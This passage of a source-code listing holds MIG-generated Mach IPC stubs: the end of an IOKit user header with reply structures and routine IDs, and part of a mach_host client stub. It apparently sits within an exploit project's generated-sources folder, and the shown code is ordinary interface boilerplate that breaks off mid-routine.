		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
	} __Reply__io_service_get_matching_service_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
	} __Reply__io_service_get_matching_services_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t matches;
	} __Reply__io_service_match_property_table_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
	} __Reply__io_service_add_notification_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t path_ool;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[4096];
		mach_msg_type_number_t path_oolCnt;
	} __Reply__io_registry_entry_get_path_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t registry_entry;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply__io_registry_entry_from_path_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t exists;
	} __Reply__io_device_tree_entry_exists_with_name_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_vm_size_t bufsize;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_properties_bin_buf_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_vm_size_t bufsize;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_property_bin_buf_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Reply__iokit_subsystem__defined */

/* union of all replies */

#ifndef __ReplyUnion__iokit_subsystem__defined
#define __ReplyUnion__iokit_subsystem__defined
union __ReplyUnion__iokit_subsystem {
	__Reply__io_object_get_class_t Reply_io_object_get_class;
	__Reply__io_object_conforms_to_t Reply_io_object_conforms_to;
	__Reply__io_iterator_next_t Reply_io_iterator_next;
	__Reply__io_iterator_reset_t Reply_io_iterator_reset;
	__Reply__io_service_get_matching_services_t Reply_io_service_get_matching_services;
	__Reply__io_registry_entry_get_property_t Reply_io_registry_entry_get_property;
	__Reply__io_registry_create_iterator_t Reply_io_registry_create_iterator;
	__Reply__io_registry_iterator_enter_entry_t Reply_io_registry_iterator_enter_entry;
	__Reply__io_registry_iterator_exit_entry_t Reply_io_registry_iterator_exit_entry;
	__Reply__io_registry_entry_from_path_t Reply_io_registry_entry_from_path;
	__Reply__io_registry_entry_get_name_t Reply_io_registry_entry_get_name;
	__Reply__io_registry_entry_get_properties_t Reply_io_registry_entry_get_properties;
	__Reply__io_registry_entry_get_property_bytes_t Reply_io_registry_entry_get_property_bytes;
	__Reply__io_registry_entry_get_child_iterator_t Reply_io_registry_entry_get_child_iterator;
	__Reply__io_registry_entry_get_parent_iterator_t Reply_io_registry_entry_get_parent_iterator;
	__Reply__io_service_close_t Reply_io_service_close;
	__Reply__io_connect_get_service_t Reply_io_connect_get_service;
	__Reply__io_connect_add_client_t Reply_io_connect_add_client;
	__Reply__io_connect_set_properties_t Reply_io_connect_set_properties;
	__Reply__io_registry_entry_get_path_t Reply_io_registry_entry_get_path;
	__Reply__io_registry_get_root_entry_t Reply_io_registry_get_root_entry;
	__Reply__io_registry_entry_set_properties_t Reply_io_registry_entry_set_properties;
	__Reply__io_registry_entry_in_plane_t Reply_io_registry_entry_in_plane;
	__Reply__io_object_get_retain_count_t Reply_io_object_get_retain_count;
	__Reply__io_service_get_busy_state_t Reply_io_service_get_busy_state;
	__Reply__io_service_wait_quiet_t Reply_io_service_wait_quiet;
	__Reply__io_registry_entry_create_iterator_t Reply_io_registry_entry_create_iterator;
	__Reply__io_iterator_is_valid_t Reply_io_iterator_is_valid;
	__Reply__io_catalog_send_data_t Reply_io_catalog_send_data;
	__Reply__io_catalog_terminate_t Reply_io_catalog_terminate;
	__Reply__io_catalog_get_data_t Reply_io_catalog_get_data;
	__Reply__io_catalog_get_gen_count_t Reply_io_catalog_get_gen_count;
	__Reply__io_catalog_module_loaded_t Reply_io_catalog_module_loaded;
	__Reply__io_catalog_reset_t Reply_io_catalog_reset;
	__Reply__io_service_request_probe_t Reply_io_service_request_probe;
	__Reply__io_registry_entry_get_name_in_plane_t Reply_io_registry_entry_get_name_in_plane;
	__Reply__io_service_match_property_table_t Reply_io_service_match_property_table;
	__Reply__io_connect_get_notification_semaphore_t Reply_io_connect_get_notification_semaphore;
	__Reply__io_registry_entry_get_location_in_plane_t Reply_io_registry_entry_get_location_in_plane;
	__Reply__io_registry_entry_get_property_recursively_t Reply_io_registry_entry_get_property_recursively;
	__Reply__io_service_get_state_t Reply_io_service_get_state;
	__Reply__io_service_get_matching_services_ool_t Reply_io_service_get_matching_services_ool;
	__Reply__io_service_match_property_table_ool_t Reply_io_service_match_property_table_ool;
	__Reply__io_object_get_superclass_t Reply_io_object_get_superclass;
	__Reply__io_object_get_bundle_identifier_t Reply_io_object_get_bundle_identifier;
	__Reply__io_service_open_extended_t Reply_io_service_open_extended;
	__Reply__io_connect_map_memory_into_task_t Reply_io_connect_map_memory_into_task;
	__Reply__io_connect_unmap_memory_from_task_t Reply_io_connect_unmap_memory_from_task;
	__Reply__io_connect_method_t Reply_io_connect_method;
	__Reply__io_connect_async_method_t Reply_io_connect_async_method;
	__Reply__io_connect_set_notification_port_t Reply_io_connect_set_notification_port;
	__Reply__io_service_add_notification_t Reply_io_service_add_notification;
	__Reply__io_service_add_interest_notification_t Reply_io_service_add_interest_notification;
	__Reply__io_service_add_notification_ool_t Reply_io_service_add_notification_ool;
	__Reply__io_registry_entry_get_registry_entry_id_t Reply_io_registry_entry_get_registry_entry_id;
	__Reply__io_connect_method_var_output_t Reply_io_connect_method_var_output;
	__Reply__io_service_get_matching_service_t Reply_io_service_get_matching_service;
	__Reply__io_service_get_matching_service_ool_t Reply_io_service_get_matching_service_ool;
	__Reply__io_service_get_authorization_id_t Reply_io_service_get_authorization_id;
	__Reply__io_service_set_authorization_id_t Reply_io_service_set_authorization_id;
	__Reply__io_server_version_t Reply_io_server_version;
	__Reply__io_registry_entry_get_properties_bin_t Reply_io_registry_entry_get_properties_bin;
	__Reply__io_registry_entry_get_property_bin_t Reply_io_registry_entry_get_property_bin;
	__Reply__io_service_get_matching_service_bin_t Reply_io_service_get_matching_service_bin;
	__Reply__io_service_get_matching_services_bin_t Reply_io_service_get_matching_services_bin;
	__Reply__io_service_match_property_table_bin_t Reply_io_service_match_property_table_bin;
	__Reply__io_service_add_notification_bin_t Reply_io_service_add_notification_bin;
	__Reply__io_registry_entry_get_path_ool_t Reply_io_registry_entry_get_path_ool;
	__Reply__io_registry_entry_from_path_ool_t Reply_io_registry_entry_from_path_ool;
	__Reply__io_device_tree_entry_exists_with_name_t Reply_io_device_tree_entry_exists_with_name;
	__Reply__io_registry_entry_get_properties_bin_buf_t Reply_io_registry_entry_get_properties_bin_buf;
	__Reply__io_registry_entry_get_property_bin_buf_t Reply_io_registry_entry_get_property_bin_buf;
};
#endif /* !__RequestUnion__iokit_subsystem__defined */

#ifndef subsystem_to_name_map_iokit
#define subsystem_to_name_map_iokit \
    { "io_object_get_class", 2800 },\
    { "io_object_conforms_to", 2801 },\
    { "io_iterator_next", 2802 },\
    { "io_iterator_reset", 2803 },\
    { "io_service_get_matching_services", 2804 },\
    { "io_registry_entry_get_property", 2805 },\
    { "io_registry_create_iterator", 2806 },\
    { "io_registry_iterator_enter_entry", 2807 },\
    { "io_registry_iterator_exit_entry", 2808 },\
    { "io_registry_entry_from_path", 2809 },\
    { "io_registry_entry_get_name", 2810 },\
    { "io_registry_entry_get_properties", 2811 },\
    { "io_registry_entry_get_property_bytes", 2812 },\
    { "io_registry_entry_get_child_iterator", 2813 },\
    { "io_registry_entry_get_parent_iterator", 2814 },\
    { "io_service_close", 2816 },\
    { "io_connect_get_service", 2817 },\
    { "io_connect_add_client", 2820 },\
    { "io_connect_set_properties", 2821 },\
    { "io_registry_entry_get_path", 2826 },\
    { "io_registry_get_root_entry", 2827 },\
    { "io_registry_entry_set_properties", 2828 },\
    { "io_registry_entry_in_plane", 2829 },\
    { "io_object_get_retain_count", 2830 },\
    { "io_service_get_busy_state", 2831 },\
    { "io_service_wait_quiet", 2832 },\
    { "io_registry_entry_create_iterator", 2833 },\
    { "io_iterator_is_valid", 2834 },\
    { "io_catalog_send_data", 2836 },\
    { "io_catalog_terminate", 2837 },\
    { "io_catalog_get_data", 2838 },\
    { "io_catalog_get_gen_count", 2839 },\
    { "io_catalog_module_loaded", 2840 },\
    { "io_catalog_reset", 2841 },\
    { "io_service_request_probe", 2842 },\
    { "io_registry_entry_get_name_in_plane", 2843 },\
    { "io_service_match_property_table", 2844 },\
    { "io_connect_get_notification_semaphore", 2852 },\
    { "io_registry_entry_get_location_in_plane", 2854 },\
    { "io_registry_entry_get_property_recursively", 2855 },\
    { "io_service_get_state", 2856 },\
    { "io_service_get_matching_services_ool", 2857 },\
    { "io_service_match_property_table_ool", 2858 },\
    { "io_object_get_superclass", 2860 },\
    { "io_object_get_bundle_identifier", 2861 },\
    { "io_service_open_extended", 2862 },\
    { "io_connect_map_memory_into_task", 2863 },\
    { "io_connect_unmap_memory_from_task", 2864 },\
    { "io_connect_method", 2865 },\
    { "io_connect_async_method", 2866 },\
    { "io_connect_set_notification_port", 2867 },\
    { "io_service_add_notification", 2868 },\
    { "io_service_add_interest_notification", 2869 },\
    { "io_service_add_notification_ool", 2870 },\
    { "io_registry_entry_get_registry_entry_id", 2871 },\
    { "io_connect_method_var_output", 2872 },\
    { "io_service_get_matching_service", 2873 },\
    { "io_service_get_matching_service_ool", 2874 },\
    { "io_service_get_authorization_id", 2875 },\
    { "io_service_set_authorization_id", 2876 },\
    { "io_server_version", 2877 },\
    { "io_registry_entry_get_properties_bin", 2878 },\
    { "io_registry_entry_get_property_bin", 2879 },\
    { "io_service_get_matching_service_bin", 2880 },\
    { "io_service_get_matching_services_bin", 2881 },\
    { "io_service_match_property_table_bin", 2882 },\
    { "io_service_add_notification_bin", 2884 },\
    { "io_registry_entry_get_path_ool", 2885 },\
    { "io_registry_entry_from_path_ool", 2886 },\
    { "io_device_tree_entry_exists_with_name", 2887 },\
    { "io_registry_entry_get_properties_bin_buf", 2888 },\
    { "io_registry_entry_get_property_bin_buf", 2889 }
#endif

#ifdef __AfterMigUserHeader
__AfterMigUserHeader
#endif /* __AfterMigUserHeader */

#endif	 /* _iokit_user_ */

```

`Exploits/oobPCI/Sources/generated/mach_host.c`:

```c
/*
 * IDENTIFICATION:
 * stub generated by bootstrap_cmds-128
 * OPTIONS: 
 */
#define	__MIG_check__Reply__mach_host_subsystem__ 1

#include "mach_host.h"

/* TODO: #include <mach/mach.h> */
#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */
extern void mach_msg_destroy(mach_msg_header_t *);
#ifdef __cplusplus
}
#endif /* __cplusplus */

#ifndef	mig_internal
#define	mig_internal	static __inline__
#endif	/* mig_internal */

#ifndef	mig_external
#define mig_external
#endif	/* mig_external */

#if	!defined(__MigTypeCheck) && defined(TypeCheck)
#define	__MigTypeCheck		TypeCheck	/* Legacy setting */
#endif	/* !defined(__MigTypeCheck) */

#if	!defined(__MigKernelSpecificCode) && defined(_MIG_KERNEL_SPECIFIC_CODE_)
#define	__MigKernelSpecificCode	_MIG_KERNEL_SPECIFIC_CODE_	/* Legacy setting */
#endif	/* !defined(__MigKernelSpecificCode) */

#ifndef	LimitCheck
#define	LimitCheck 0
#endif	/* LimitCheck */

#ifndef	min
#define	min(a,b)  ( ((a) < (b))? (a): (b) )
#endif	/* min */

#if !defined(_WALIGN_)
#define _WALIGN_(x) (((x) + 3) & ~3)
#endif /* !defined(_WALIGN_) */

#if !defined(_WALIGNSZ_)
#define _WALIGNSZ_(x) _WALIGN_(sizeof(x))
#endif /* !defined(_WALIGNSZ_) */

#ifndef	UseStaticTemplates
#define	UseStaticTemplates	0
#endif	/* UseStaticTemplates */

#ifndef MIG_SERVER_ROUTINE
#define MIG_SERVER_ROUTINE
#endif

#ifndef	__MachMsgErrorWithTimeout
#define	__MachMsgErrorWithTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	case MACH_SEND_TIMED_OUT: \
	case MACH_RCV_TIMED_OUT: \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithTimeout */

#ifndef	__MachMsgErrorWithoutTimeout
#define	__MachMsgErrorWithoutTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithoutTimeout */

#ifndef	__DeclareSendRpc
#define	__DeclareSendRpc(_NUM_, _NAME_)
#endif	/* __DeclareSendRpc */

#ifndef	__BeforeSendRpc
#define	__BeforeSendRpc(_NUM_, _NAME_)
#endif	/* __BeforeSendRpc */

#ifndef	__AfterSendRpc
#define	__AfterSendRpc(_NUM_, _NAME_)
#endif	/* __AfterSendRpc */

#ifndef	__DeclareSendSimple
#define	__DeclareSendSimple(_NUM_, _NAME_)
#endif	/* __DeclareSendSimple */

#ifndef	__BeforeSendSimple
#define	__BeforeSendSimple(_NUM_, _NAME_)
#endif	/* __BeforeSendSimple */

#ifndef	__AfterSendSimple
#define	__AfterSendSimple(_NUM_, _NAME_)
#endif	/* __AfterSendSimple */

#define msgh_request_port	msgh_remote_port
#define msgh_reply_port		msgh_local_port



#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_info_t__defined)
#define __MIG_check__Reply__host_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_info_t(__Reply__host_info_t *Out0P)
{

	typedef __Reply__host_info_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 300) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 272)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->host_info_outCnt > 68 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 272)) / 4< Out0P->host_info_outCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 272) + Out0P->host_info_outCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_info */
mig_external kern_return_t host_info
(
	host_t host,
	host_flavor_t flavor,
	host_info_t host_info_out,
	mach_msg_type_number_t *host_info_outCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		host_flavor_t flavor;
		mach_msg_type_number_t host_info_outCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info_outCnt;
		integer_t host_info_out[68];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info_outCnt;
		integer_t host_info_out[68];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_info_t__defined */

	__DeclareSendRpc(200, "host_info")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*host_info_outCnt < 68)
		InP->host_info_outCnt = *host_info_outCnt;
	else
		InP->host_info_outCnt = 68;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 200;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(200, "host_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(200, "host_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_info_t__defined)
	check_result = __MIG_check__Reply__host_info_t((__Reply__host_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_info_t__defined) */

	if (Out0P->host_info_outCnt > *host_info_outCnt) {
		(void)memcpy((char *) host_info_out, (const char *) Out0P->host_info_out, 4 *  *host_info_outCnt);
		*host_info_outCnt = Out0P->host_info_outCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) host_info_out, (const char *) Out0P->host_info_out, 4 * Out0P->host_info_outCnt);

	*host_info_outCnt = Out0P->host_info_outCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_kernel_version_t__defined)
#define __MIG_check__Reply__host_kernel_version_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_kernel_version_t(__Reply__host_kernel_version_t *Out0P)
{

	typedef __Reply__host_kernel_version_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 301) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 512)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->kernel_versionCnt > 512 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 512))< Out0P->kernel_versionCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 512) + _WALIGN_(Out0P->kernel_versionCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_kernel_version_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_kernel_version */
mig_external kern_return_t host_kernel_version
(
	host_t host,
	kernel_version_t kernel_version
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t kernel_versionOffset; /* MiG doesn't use it */
		mach_msg_type_number_t kernel_versionCnt;
		char kernel_version[512];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t kernel_versionOffset; /* MiG doesn't use it */
		mach_msg_type_number_t kernel_versionCnt;
		char kernel_version[512];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_kernel_version_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_kernel_version_t__defined */

	__DeclareSendRpc(201, "host_kernel_version")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 201;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(201, "host_kernel_version")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(201, "host_kernel_version")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_kernel_version_t__defined)
	check_result = __MIG_check__Reply__host_kernel_version_t((__Reply__host_kernel_version_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_kernel_version_t__defined) */

	(void) mig_strncpy(kernel_version, Out0P->kernel_version, 512);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply___host_page_size_t__defined)
#define __MIG_check__Reply___host_page_size_t__defined

mig_internal kern_return_t __MIG_check__Reply___host_page_size_t(__Reply___host_page_size_t *Out0P)
{

	typedef __Reply___host_page_size_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 302) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply___host_page_size_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine _host_page_size */
mig_external kern_return_t _host_page_size
(
	host_t host,
	vm_size_t *out_page_size
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		vm_size_t out_page_size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		vm_size_t out_page_size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply___host_page_size_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply___host_page_size_t__defined */

	__DeclareSendRpc(202, "_host_page_size")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 202;
